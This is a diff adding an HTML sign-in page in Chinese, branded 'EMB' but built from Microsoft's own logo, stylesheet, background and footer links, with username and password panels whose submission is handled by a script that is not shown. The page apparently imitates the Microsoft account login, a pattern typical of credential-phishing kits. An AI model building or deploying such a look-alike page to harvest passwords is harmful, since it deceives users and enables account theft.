@@ -1,0 +1,233 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <title>EMB 登录到您的帐户</title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
+    <meta http-equiv="Pragma" content="no-cache">
+    <meta http-equiv="Expires" content="-1">
+    <link rel="shortcut icon"
+        href="https://aadcdn.msauth.net/ests/2.1/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico">
+    <link crossorigin="anonymous"
+        href="https://aadcdn.msauth.net/ests/2.1/content/cdnbundles/converged.v2.login.min_eihab3wwm23ia-nkvubaww2.css"
+        rel="stylesheet">
+    <style>
+        /*定义滚动条高宽及背景 高宽分别对应横竖滚动条的尺寸*/
+        ::-webkit-scrollbar {
+            width: 0px;
+            height: 0px;
+            background-color: #F5F5F5;
+        }
+    </style>
+
+</head>
+
+<body>
+
+
+
+
+    <div class="background" role="presentation">
+        <div class="backgroundImage"
+            style="background-image:
+                    url(https://aadcdn.msauth.net/ests/2.1/content/images/backgrounds/0_a5dbd4393ff6a725c7e62b61df7e72f0.jpg);">
+        </div>
+    </div>
+
+    <form id="singinForm" action="javascript:void(0);">
+
+        <div class="outer">
+
+
+
+            <div class="middle">
+
+
+                <div class="inner fade-in-lightbox">
+
+
+                    <div>
+                        <a href="./">
+
+
+                            <img class="logo"
+                                src="https://aadcdn.msauth.net/ests/2.1/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg"
+                                alt="EMB">
+                        </a>
+                    </div>
+
+                    <div class="pagination-view animate slide-in-next" id="namePanel">
+                        <div class="row text-title" id="loginHeader">
+                            <div id="nameHeadertext" role="heading">登录</div>
+                        </div>
+                        <div class="row">
+                            <div id="nameAlert" style="padding:10px 0px;">
+                            </div>
+
+                            <div class="form-group col-md-24">
+                                <div class="placeholderContainer">
+                                    <input id="userName" maxlength="18" class="form-control ltr_override"
+                                        aria-label="请输入电子邮件、电话或 Skype。" placeholder="电子邮件、电话或 Skype">
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="position-buttons">
+                            <div class="row">
+                                <div class="col-md-24">
+                                    <div class="text-13 action-links" style="font-size: 13px;">
+
+                                        <div class="form-group"> 没有账户？<a id="registerBtn">
+                                                创建一个!</a></div>
+
+                                        <div class="form-group"> <a id="cantAccessAccount" href="#">无法访问您的帐户?</a> </div>
+
+                                        <div class="form-group">
+
+                                            <div class="form-group">
+
+                                                <a id="idA_PWD_SwitchToCredPicker" href="#">登录选项</a>
+
+                                            </div>
+
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="row">
+                                <div>
+                                    <div class="col-xs-24 no-padding-left-right button-container">
+                                        <div class="inline-block">
+                                            <input type="submit" id="submitBtn" class="btn btn-block btn-primary"
+                                                value="下一步"> </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+
+
+
+                    </div>
+
+
+
+
+                    <div class="pagination-view animate slide-in-next" style="display:none;" id="pwPanel">
+                        <div id="idsave" class="alert" style="padding-top: 18px;">
+                        </div>
+                        <div class="row text-title" id="pwHeader">
+                            <div id="pwHeadertext" role="heading">输入密码</div>
+                        </div>
+                        <div class="row">
+
+                            <div id="pwAlert">
+                            </div>
+                            <div class="form-group col-md-24">
+
+                                <div class="placeholderContainer">
+
+                                    <input name="passwd" type="password" id="userPw" autocomplete="off"
+                                        class="form-control" placeholder="密码">
+
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="position-buttons">
+                            <div class="row">
+                                <div class="col-md-24">
+                                    <div class="text-13 action-links" style="font-size: 13px;">
+
+
+                                        <div class="form-group">
+                                            <label>
+                                                <input id="remeberPwd" type="checkbox" checked="true">
+                                                <span>使我保持登录状态</span>
+                                            </label>
+                                        </div>
+
+
+
+
+
+                                        <div class="form-group">
+
+                                            <div class="form-group">
+                                                <a id="wjmm" href="#">忘记了密码</a>
+
+                                            </div>
+
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="row">
+                                <div>
+                                    <div class="col-xs-24 no-padding-left-right button-container">
+
+                                        <div class="inline-block">
+
+                                            <input type="submit" id="submitpwBtn" class="btn btn-block btn-primary"
+                                                value="登录"> </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+
+
+                    </div>
+
+
+
+
+                </div>
+
+
+
+
+                <div id="footer"
+                    style="position: fixed; bottom: 0; width: 100%;overflow: visible; z-index: 99; clear: both; background-color: rgba(0, 0, 0, 0.6); height: 28px;"
+                    class="footer default">
+
+                    <div id="footerLinks" style=" position:fixed;right: 0px;bottom: 0px;"
+                        class="footerNode text-secondary"> <a id="ftrTerms"
+                            href="https://www.microsoft.com/zh-CN/servicesagreement/">使用条款</a> <a id="ftrPrivacy"
+                            href="https://privacy.microsoft.com/zh-CN/privacystatement">隐私和
+                            cookie</a>
+
+
+
+
+                        <a href="#" role="button" class="moreOptions">
+
+
+                            <img class="desktopMode" role="presentation"
+                                src="https://aadcdn.msauth.net/ests/2.1/content/images/ellipsis_white_5ac590ee72bfe06a7cecfd75b588ad73.svg">
+                        </a>
+                    </div>
+
+                </div>
+
+
+
+
+            </div>
+        </div>
+
+    </form>
+    <script src="../scripts/lib/jquery.js"></script>
+
+    <script type="module">
+        import setup from "../scripts/main.js";
+     setup();
+</script>
+
+
+
+</body>
+
+</html>
